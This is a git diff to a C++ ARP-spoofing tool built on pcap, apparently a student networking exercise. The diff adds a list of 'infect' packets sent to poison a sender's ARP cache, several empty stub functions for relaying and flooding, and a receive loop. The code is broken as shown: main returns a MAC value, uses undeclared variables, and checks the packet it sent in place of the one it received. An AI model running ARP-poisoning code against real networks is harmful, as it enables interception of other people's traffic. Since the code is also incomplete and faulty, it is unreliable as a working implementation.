@@ -6,8 +6,22 @@
 #include "EthArpPacket.h"
 #include "ethhdr.h"
 #include "arphdr.h"
-#include<iostream>
-#include<string>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <iostream>
+using namespace std;
+#pragma pack(push, 1)
+struct Spoof final{
+    Spoof(){}
+    Spoof(Ip sip, Ip tip,EthArpPacket* pckt){}
+public:
+	Ip sip_;
+    Ip tip_;
+    EthArpPacket* infctpckt;
+};
+#pragma pack(pop)
+vector<Spoof> spoofvector;
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
@@ -67,6 +81,18 @@ Mac getsendermac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
     }
 }
 
+int isRelay(EthArpPacket* pckt){
+
+
+	return 1;
+}
+
+void SendInfectFlood(EthArpPacket* pckt){
+
+}
+void SendInfect(){
+	
+}
 int main(int argc, char* argv[]) {
 	if (argc != 4) {
 		usage();
@@ -82,6 +108,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	EthArpPacket packet;
+	EthArpPacket* receivedpckt;
 	///using ioctl & ifreq to get device information
 	int sock;
 	struct ifreq ifr;
@@ -123,14 +150,33 @@ int main(int argc, char* argv[]) {
 	packet.arp_.sip_ = htonl(targetip);//ip of target
 	packet.arp_.tmac_ = smac;//mac of sender
 	packet.arp_.tip_ = htonl(senderip);//ip of sender
+	///arp packet creation func out
 
-	while(1){
+	for(int i=0; i<spoofvector.size(); i++){
 		printf("sending arp!!...\n");
-		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofvector[i].infctpckt), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
-		sleep(5);
 	}
+	while(1){
+		struct pcap_pkthdr* header;
+		int res = pcap_next_ex(handle, &header, reinterpret_cast<u_char**>(&receivedpckt));
+		if (res == 0) continue;
+    	if (res == -1 || res == -2) {
+        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+        	exit(1);
+		}
+		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==sip){//if received packet is Arpreply and ip check
+			Mac resultmac=packet.arp_.smac_;
+			return resultmac;
+		}
+		limit++; // revise: time based*** - ##thread## chrono..?
+		if(limit>=3){//pcap handle waits 10ms for 5times
+			std::cout<<"[Error] Cannot reach ip: "<<std::string(sip)<<", please check the <sender ip> again"<<std::endl;
+			exit(1);
+		}
+		sleep(0);
+    }
 	pcap_close(handle);
 }
